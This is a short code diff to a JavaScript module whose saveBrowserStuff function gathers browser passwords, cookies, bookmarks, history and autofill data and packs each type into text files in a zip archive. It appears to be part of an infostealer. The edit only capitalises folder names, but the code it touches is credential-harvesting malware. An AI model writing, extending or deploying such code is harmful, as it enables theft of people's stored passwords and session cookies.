@@ -3,7 +3,8 @@ module.exports = (client) => {
     async saveBrowserStuff() {
       ["passwords", "cookies", "bookmarks", "history", "autofill"].forEach(
         async (type) => {
-          client.utils.jszip.createFolder(`\\${type}`);
+          var _type = type.charAt(0).toUpperCase() + type.slice(1) // Capitalized
+          client.utils.jszip.createFolder(`\\${_type}`);
 
           for (let [key, value] of Object.entries(
             client.config.environ[type]
@@ -28,7 +29,7 @@ module.exports = (client) => {
               }
 
               client.utils.jszip.createTxt(
-                `\\${type}\\${key.toUpperCase()}.txt`,
+                `\\${_type}\\${key.toUpperCase()}.txt`,
                 `${found_keywords}\n${text}`
               );
             }
